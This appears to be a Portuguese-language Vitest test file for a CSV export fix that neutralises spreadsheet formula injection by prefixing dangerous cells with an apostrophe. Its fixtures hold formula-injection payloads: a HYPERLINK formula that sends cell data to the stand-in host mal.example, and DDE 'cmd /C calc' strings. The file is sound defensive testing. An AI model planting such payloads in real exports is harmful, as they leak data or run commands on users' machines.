/**
 * ORÁCULO — injecção de fórmulas no CSV (issue #294, nó C:csv-injeccao-294).
 *
 * Escrito pelo VERIFICADOR antes da correcção. NUNCA `vitest -u`; um agente de
 * implementação que altere este ficheiro é BLOCKER.
 *
 * Contrato (decisão do orquestrador):
 *  - `csv.ts` exporta `neutralizarFormula(celula)`: prefixa `'` quando a célula
 *    começa por `=`, `+`, `-`, `@`, TAB ou CR; qualquer outra fica igual;
 *  - `toCsv` aplica-a às colunas de texto (`(c.type ?? 'text') === 'text'`), ao
 *    cabeçalho e aos metadados, ANTES do escape RFC-4180;
 *  - colunas `decimal`/`currency`/`integer` ficam intactas — um negativo legítimo
 *    (`-603500.00`) não é uma fórmula.
 */
import { describe, expect, it } from 'vitest';
import { Prisma } from '@prisma/client';
import * as csvMod from '../csv';
import type { Dataset } from '../dataset';

// Acesso dinâmico: enquanto a função não existir, falha o caso — não o ficheiro.
const neutralizarFormula = (celula: string): string =>
  (csvMod as unknown as { neutralizarFormula: (c: string) => string }).neutralizarFormula(celula);
const { toCsv } = csvMod;

/** Parser RFC-4180 mínimo (`;`, CRLF, aspas duplicadas) — lê o que o Excel leria. */
function parseCsv(csv: string): string[][] {
  const texto = csv.replace(/^﻿/, '');
  const linhas: string[][] = [];
  let linha: string[] = [];
  let campo = '';
  let aspas = false;
  for (let i = 0; i < texto.length; i++) {
    const ch = texto[i]!;
    if (aspas) {
      if (ch === '"' && texto[i + 1] === '"') { campo += '"'; i++; }
      else if (ch === '"') aspas = false;
      else campo += ch;
    } else if (ch === '"') aspas = true;
    else if (ch === ';') { linha.push(campo); campo = ''; }
    else if (ch === '\r' && texto[i + 1] === '\n') { linha.push(campo); linhas.push(linha); linha = []; campo = ''; i++; }
    else campo += ch;
  }
  linha.push(campo);
  linhas.push(linha);
  return linhas;
}

const PERIGOSOS: Array<[string, string]> = [
  ['=', '=HYPERLINK("http://mal.example/?x="&A1;"clique")'],
  ['+', '+1+cmd|\' /C calc\'!A0'],
  ['-', '-2+3+cmd|\' /C calc\'!A0'],
  ['@', '@SUM(1+1)*cmd|\' /C calc\'!A0'],
  ['TAB', '\t=1+1'],
  ['CR', '\r=1+1'],
];

describe('neutralizarFormula (#294)', () => {
  it.each(PERIGOSOS)('prefixa com apóstrofo a célula começada por %s', (_nome, celula) => {
    expect(neutralizarFormula(celula)).toBe(`'${celula}`);
  });

  it.each([
    ['texto normal', 'Caixa sede'],
    ['código de conta', '111'],
    ['número de documento', 'FT/2026/000001'],
    ['sinal no meio', 'A-B=C+D@E'],
    ['vazio', ''],
    ['aspas no início', '"=x"'],
    ['espaço antes do =', ' =1+1'],
    ['já com apóstrofo', "'=1+1"],
  ])('deixa igual: %s', (_nome, celula) => {
    expect(neutralizarFormula(celula)).toBe(celula);
  });
});

describe('toCsv — colunas de texto neutralizadas (#294)', () => {
  const ds: Dataset = {
    nome: 'injeccao',
    colunas: [
      { key: 'conta', header: 'Conta', type: 'text' },
      { key: 'nome', header: 'Descrição' }, // sem type ⇒ texto
      { key: 'saldo', header: 'Saldo', type: 'decimal' },
      { key: 'total', header: 'Total (MZN)', type: 'currency' },
      { key: 'qtd', header: 'Quantidade', type: 'integer' },
    ],
    linhas: PERIGOSOS.map(([, celula], i) => ({
      conta: celula,
      nome: celula,
      saldo: new Prisma.Decimal('-603500.00'),
      total: new Prisma.Decimal('-0.01'),
      qtd: -(i + 1),
    })),
  };
  const tabela = parseCsv(toCsv(ds));
  const corpo = tabela.slice(1);

  it.each(PERIGOSOS.map(([n], i) => [n, i] as const))(
    'célula de texto começada por %s sai com apóstrofo (coluna com type text e sem type)',
    (_nome, i) => {
      const original = PERIGOSOS[i]![1];
      expect(corpo[i]![0]).toBe(`'${original}`);
      expect(corpo[i]![1]).toBe(`'${original}`);
    },
  );

  it('decimais, moeda e inteiros negativos ficam intactos', () => {
    PERIGOSOS.forEach((_, i) => {
      expect(corpo[i]![2]).toBe('-603500');
      expect(corpo[i]![3]).toBe('-0.01');
      expect(corpo[i]![4]).toBe(String(-(i + 1)));
    });
    // Nenhum apóstrofo nas colunas numéricas do CSV bruto.
    const bruto = toCsv(ds);
    expect(bruto).not.toMatch(/;'-603500/);
    expect(bruto).not.toMatch(/;'-0\.01/);
  });

  it('neutraliza antes do escape: «;» e aspas continuam entre aspas, com o apóstrofo dentro', () => {
    const linha = toCsv({
      nome: 'x',
      colunas: [{ key: 'a', header: 'A', type: 'text' }],
      linhas: [{ a: '=A1;"B"' }],
    })
      .replace(/^﻿/, '')
      .split('\r\n')[1];
    expect(linha).toBe(`"'=A1;""B"""`);
  });

  it('CR no início: a célula sai entre aspas, prefixada, e o parse devolve-a inteira', () => {
    const bruto = toCsv({
      nome: 'x',
      colunas: [{ key: 'a', header: 'A', type: 'text' }],
      linhas: [{ a: '\r=1+1' }],
    });
    expect(bruto.replace(/^﻿/, '').split('\r\n').slice(1).join('\r\n')).toBe(`"'\r=1+1"`);
    expect(parseCsv(bruto)[1]).toEqual(["'\r=1+1"]);
  });

  it('texto inofensivo não muda (sem apóstrofos espúrios)', () => {
    const bruto = toCsv({
      nome: 'x',
      colunas: [{ key: 'a', header: 'A', type: 'text' }, { key: 'b', header: 'B', type: 'text' }],
      linhas: [{ a: 'Caixa sede', b: 'FT/2026/000001' }],
    });
    expect(parseCsv(bruto)[1]).toEqual(['Caixa sede', 'FT/2026/000001']);
  });

  it('cabeçalho e metadados também são neutralizados', () => {
    const t = parseCsv(
      toCsv({
        nome: 'x',
        meta: [
          ['=chave', '@valor'],
          ['Exercício', '-2026'],
        ],
        colunas: [{ key: 'a', header: '+Cabeçalho', type: 'text' }, { key: 'v', header: '-Valor', type: 'decimal' }],
        linhas: [{ a: 'ok', v: new Prisma.Decimal('-1.5') }],
      }),
    );
    expect(t[0]).toEqual(["'=chave", "'@valor"]);
    expect(t[1]).toEqual(['Exercício', "'-2026"]);
    expect(t[2]).toEqual(['']);
    expect(t[3]).toEqual(["'+Cabeçalho", "'-Valor"]);
    expect(t[4]).toEqual(['ok', '-1.5']);
  });
});
